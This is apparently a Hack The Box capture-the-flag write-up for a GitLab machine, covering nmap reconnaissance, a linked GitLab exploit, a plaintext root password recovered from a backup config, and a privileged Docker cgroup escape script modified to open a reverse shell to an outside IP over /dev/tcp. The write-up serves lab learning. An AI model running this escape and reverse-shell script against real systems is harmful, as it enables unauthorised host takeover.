# Box 



![image-20210317135718348](img/image-20210317135718348.png)

https://www.hackthebox.eu/home/machines/profile/304

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#Reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.220 10.10.10.220
```

![image-20210316172716303](img/image-20210316172716303.png)

Let's go to the website, we have gitlab website that we can register : 

![image-20210317140011906](img/image-20210317140011906.png)

I foud the foothold quickly with the version : 

![image-20210317142128618](img/image-20210317142128618.png)

## Exploitation

This is the exploit I found  :

https://www.exploit-db.com/exploits/49334

![image-20210317142206628](img/image-20210317142206628.png)

## Post-Exploitation

### User

The group `git` can read the user.txt file.

![image-20210317151720576](img/image-20210317151720576.png)

### Root

I found a password in the `gitlab.rb` file in the `/opt/backup` folder

![image-20210317152713769](img/image-20210317152713769.png)

it worked for root so we have a login :

```
root:wW59U!ZKMbG9+*#h
```

Unfortunaly there is no root.txt in the `/root` folder because we are in a docker container. We have to escape.

![image-20210317152855485](img/image-20210317152855485.png)

In the previous folder there is anothing interesting file `docker-compose.yml`: 

![image-20210317154625283](img/image-20210317154625283.png)

In this file there is one particular interesting line 

```bash
 privileged: true
```

I've read  in the past  an exploit about privileged docker that can execute command on the host which you can find here : 

https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1

Modify the script to get a reverse shell : 

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "bash -c 'exec bash -i &>/dev/tcp/10.10.14.17/1234 <&1' > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

![image-20210317154911429](img/image-20210317154911429.png)

Rooted.

